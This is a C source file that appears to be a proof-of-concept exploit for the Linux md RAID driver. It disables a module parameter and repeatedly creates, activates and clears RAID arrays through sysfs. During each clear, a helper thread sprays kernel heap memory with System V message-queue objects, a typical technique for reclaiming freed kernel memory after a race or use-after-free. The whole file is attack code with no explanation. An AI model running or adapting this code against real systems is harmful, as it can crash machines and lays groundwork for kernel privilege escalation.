#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <sched.h>

static int wr(const char *p, const char *v, int *er)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0) { if (er) *er = errno; return -1; }
    ssize_t n = write(fd, v, strlen(v));
    int e = errno;
    close(fd);
    if (er) *er = e;
    return n < 0 ? -1 : 0;
}

static long rdnum(const char *p)
{
    char b[64];
    int fd = open(p, O_RDONLY);
    if (fd < 0) return -999;
    int n = read(fd, b, sizeof(b) - 1);
    close(fd);
    if (n <= 0) return -998;
    b[n] = 0;
    return atol(b);
}

struct spray_arg {
    int qid;
    int count;
    int size;
    volatile int *go;
    volatile int *done;
};

static void *spray_thread(void *a)
{
    struct spray_arg *sa = (struct spray_arg *)a;
    int sz = sa->size;
    char *msg = malloc(sz + 32);
    if (!msg) return NULL;
    for (;;) {
        while (!*sa->go) {
            if (*sa->done) { free(msg); return NULL; }
            sched_yield();
        }
        for (int i = 0; i < sa->count; i++) {
            *(long *)msg = 1;
            memset(msg + 8, 0x41, sz);
            if (msgsnd(sa->qid, msg, sz, IPC_NOWAIT) < 0)
                break;
        }
        *sa->go = 0;
        *sa->done = 1;
    }
}

int main(int argc, char **argv)
{
    int rounds = argc > 1 ? atoi(argv[1]) : 20;

    printf("V6 uid=%d rounds=%d\n", getuid(), rounds);
    fflush(stdout);

    printf("legacy_async before = %ld\n", rdnum("/sys/module/md_mod/parameters/legacy_async_del_gendisk"));

    int e = 0;
    int r = wr("/sys/module/md_mod/parameters/legacy_async_del_gendisk", "N", &e);
    printf("set legacy_async=0 r=%d e=%d\n", r, e);
    printf("legacy_async after = %ld\n", rdnum("/sys/module/md_mod/parameters/legacy_async_del_gendisk"));
    fflush(stdout);

    int qid = msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
    if (qid < 0) { printf("msgget fail %d\n", errno); return 1; }

    volatile int go = 0, done = 0;
    struct spray_arg sa = { qid, 3000, 960, &go, &done };
    pthread_t th;
    pthread_create(&th, NULL, spray_thread, &sa);

    int ok_c = 0, ok_a = 0, ok_cl = 0;

    for (int i = 0; i < rounds; i++) {
        char name[32], p[192];
        snprintf(name, sizeof(name), "md%d", i);

        e = 0;
        if (wr("/sys/module/md_mod/parameters/new_array", name, &e) < 0) continue;
        ok_c++;

        snprintf(p, sizeof(p), "/sys/block/%s/md/metadata_version", name);
        wr(p, "none", &e);
        snprintf(p, sizeof(p), "/sys/block/%s/md/level", name);
        wr(p, "raid1", &e);
        snprintf(p, sizeof(p), "/sys/block/%s/md/raid_disks", name);
        wr(p, "1", &e);
        snprintf(p, sizeof(p), "/sys/block/%s/md/new_dev", name);
        wr(p, "1:0", &e);
        snprintf(p, sizeof(p), "/sys/block/%s/md/dev-ram0/state", name);
        wr(p, "in_sync", &e);

        snprintf(p, sizeof(p), "/sys/block/%s/md/array_state", name);
        e = 0;
        if (wr(p, "active", &e) == 0) ok_a++;

        done = 0;
        go = 1;

        e = 0;
        if (wr(p, "clear", &e) == 0) ok_cl++;

        for (int w = 0; w < 200 && !done; w++) usleep(500);
        go = 0;

        char tmp[8192];
        while (msgrcv(qid, tmp, sizeof(tmp), 0, IPC_NOWAIT | MSG_NOERROR) >= 0)
            ;

        printf("r=%d create=%d active=%d clear=%d\n", i, ok_c, ok_a, ok_cl);
        fflush(stdout);
    }

    done = 1; go = 1;
    printf("V6FINAL create=%d active=%d clear=%d\n", ok_c, ok_a, ok_cl);
    printf("V6 done\n");
    fflush(stdout);
    return 0;
}